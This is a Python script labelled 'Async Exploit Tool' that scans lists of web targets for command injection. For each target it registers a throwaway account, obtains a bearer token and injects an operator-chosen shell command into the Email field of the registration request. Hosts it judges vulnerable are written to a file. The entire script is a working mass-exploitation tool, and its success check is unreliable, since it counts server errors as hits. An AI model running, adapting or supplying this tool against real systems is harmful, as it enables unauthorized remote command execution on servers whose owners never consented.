#!/usr/bin/env python3

import os
import asyncio
import aiohttp
import argparse
import aiofiles
import random
import uvloop
from alive_progress import alive_bar
from colorama import Fore, Style
from fake_useragent import UserAgent

# Color shortcuts
green = Fore.GREEN
red = Fore.RED
yellow = Fore.YELLOW
cyan = Fore.CYAN
reset = Style.RESET_ALL

# CLI args
parser = argparse.ArgumentParser(description="Async Exploit Tool")
parser.add_argument("-u", "--url", help="Target URL")
parser.add_argument("-l", "--list", help="File with list of target URLs")
parser.add_argument("-t", "--threads", help="Concurrency", type=int, default=10)
parser.add_argument("-c", "--command", help="Command to execute", required=True)
parser.add_argument("-v", "--verbose", help="Verbose output", action="store_true")
args = parser.parse_args()


async def randomizer():
    return ''.join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(10))


async def create(url, user, psw, session):
    try:
        base_url = f"{url}/api/Account/Register"
        headers = {"User-Agent": UserAgent().random, "Content-Type": "application/json"}
        json_data = {"Email": user + "@gmail.com", "Password": psw, "ConfirmPassword": psw}

        async with session.post(base_url, headers=headers, json=json_data, ssl=False, timeout=30) as response:
            text = await response.text()
            if "is already taken" in text:
                return "taken"
            elif response.status == 200:
                return "success"
            else:
                return "failed"
    except Exception as e:
        if args.verbose:
            print(f"{red}[ERR]{reset} Error in create: {e}")
        return "error"


async def login(url, user, psw, session):
    try:
        base_url = f"{url}/Token"
        body = {"grant_type": "password", "username": user, "password": psw}
        headers = {
            "User-Agent": UserAgent().random,
            "Content-Type": "application/x-www-form-urlencoded",
        }

        async with session.post(base_url, headers=headers, data=body, ssl=False, timeout=30) as response:
            if response.status == 200:
                json_resp = await response.json()
                token = json_resp.get("access_token")
                return token
            return None
    except Exception as e:
        if args.verbose:
            print(f"{red}[ERR]{reset} Login error: {e}")
        return None


async def exploit(cmd, url, token, session, user, psw):
    try:
        base_url = f"{url}/api/Account/Register"
        headers = {
            "User-Agent": UserAgent().random,
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }

        json_data = {
            "Email": user + "@gmail.com",
            "Password": psw,
            "ConfirmPassword": psw,
        }

        # Inject the command into the Email field (example payload)
        json_data["Email"] = f"test@test.com && {cmd}"

        async with session.post(base_url, headers=headers, json=json_data, ssl=False, timeout=30) as response:
            if response.status in [200, 201, 500]:
                print(f"{green}[+] Vulnerable: {url}{reset}")
                with open("exploitable.txt", "a") as f:
                    f.write(f"{url}\n")
            else:
                if args.verbose:
                    print(f"{yellow}[-] Not vulnerable: {url}{reset}")
    except Exception as e:
        if args.verbose:
            print(f"{red}[ERR]{reset} Exploit error: {e}")


async def handle_url(url):
    user = await randomizer()
    psw = await randomizer()
    async with aiohttp.ClientSession() as session:
        created = await create(url, user, psw, session)
        if created == "success":
            token = await login(url, user, psw, session)
            if token:
                await exploit(args.command, url, token, session, user, psw)
            else:
                if args.verbose:
                    print(f"{red}[ERR]{reset} Login failed for {url}")
        else:
            if args.verbose:
                print(f"{red}[ERR]{reset} Account creation failed for {url}")


async def main():
    urls = []
    if args.url:
        urls.append(args.url.strip())
    if args.list:
        if os.path.exists(args.list):
            async with aiofiles.open(args.list, 'r') as f:
                contents = await f.readlines()
                urls.extend([line.strip() for line in contents if line.strip()])
        else:
            print(f"{red}[ERR]{reset} File not found: {args.list}")
            return

    if not urls:
        print(f"{red}[ERR]{reset} No URLs to scan.")
        return

    sem = asyncio.Semaphore(args.threads)

    async def limited_worker(u):
        async with sem:
            await handle_url(u)

    with alive_bar(len(urls), title="Scanning") as bar:
        tasks = []
        for url in urls:
            task = asyncio.create_task(limited_worker(url))
            task.add_done_callback(lambda _: bar())
            tasks.append(task)

        await asyncio.gather(*tasks)


if __name__ == "__main__":
    try:
        asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{yellow}[WRN]{reset} Interrupted by user.")

